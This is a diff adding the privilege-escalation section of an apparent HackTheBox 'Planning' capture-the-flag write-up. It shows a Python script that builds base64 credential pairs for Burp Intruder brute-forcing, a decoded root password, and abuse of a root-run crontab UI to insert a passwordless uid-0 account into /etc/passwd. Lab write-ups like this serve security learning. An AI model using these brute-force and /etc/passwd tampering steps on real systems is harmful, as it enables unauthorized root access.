@@ -124,5 +124,61 @@ $ ssh enzo@planning.htb -L 8000:localhost:8000
 ```
 
 ![](assets/img/planning_local.png)
+![](assets/img/planning_burp.png)
+I used `top-usernames-shortlist.txt` from seclists and added enzo to it, and a password file with all the passwords we have so far. The login form uses the following structure `<username>:<password>` and then base64 encodes it, so I wrote a python script to provide me the structure in a txt file so then we can feed it to Burp intruder.
 
-I used `top-usernames-shortlist.txt` from seclists and added enzo to it, and a password file with all the passwords we have so far. The login form uses the following structure `<username>:<password>` and then base64 encodes it.
+```python
+#!/bin/python3
+import base64
+
+with open('usernames.txt') as f:
+        usr=f.read().split('\n')[:-1]
+with open('passwords.txt') as f:
+        pss=f.read().split('\n')[:-1]
+
+for i in usr:
+        for j in pss:
+                tmp=base64.b64encode(bytes(f"{i}:{j}",'utf-8'))
+                with open("combine.txt","a") as f:
+                        f.write(tmp.decode('utf-8')+'\n')
+                        
+```
+![](assets/img/planning_intruder_combine.png)
+
+And here we go, got the combination!
+
+![](assets/img/planning_intruder.png)
+
+```
+$ echo cm9vdDpQNHNzdzByZFMwcFJpMFQzYw | base64 -d
+root:P4ssw0rdS0pRi0T3c
+```
+
+![](assets/img/planning_crontabui.png)
+
+After logging in, we see a crontab ui which runs commands and scripts as superuser. I made `/etc/passwd` writable and added the following line to it.
+```
+my_root::0:0:root:/root:/bin/bash
+```
+And now we can switch user to `my_root` and get root.txt.
+```
+enzo@planning:~$ su my_root
+my_root@planning:/home/enzo# cd
+my_root@planning:~# ls
+root.txt  scripts
+my_root@planning:~# cat root.txt
+891956a------------------815b733
+```
+
+Also don't forget to return `/etc/passwd` permissions to default and remove the `my_root` user from it.
+```
+my_root@planning:~# chmod 644 /etc/passwd
+my_root@planning:~# ls -la /etc/passwd
+-rw-r--r-- 1 my_root root 2031 Jul 21 12:22 /etc/passwd
+```
+
+
+![](assets/img/planning_congrats.png)
+
+Done and Dusted!  
+and thanks for reading.
